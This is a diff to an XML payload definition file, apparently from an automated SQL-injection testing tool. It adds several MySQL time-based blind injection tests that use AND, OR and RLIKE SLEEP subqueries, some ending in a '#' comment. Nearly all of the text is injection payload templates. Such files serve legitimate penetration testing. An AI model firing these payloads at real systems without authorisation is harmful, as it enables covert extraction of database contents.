@@ -85,6 +85,88 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &lt;= 5.0.11 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>2</level>
@@ -196,6 +278,47 @@
         <vector>RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))</vector>
         <request>
             <payload>RLIKE SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+     <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+             <dbms_version>&gt;= 5.0.12</dbms_version>
+       </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
             <comment>#</comment>
         </request>
         <response>
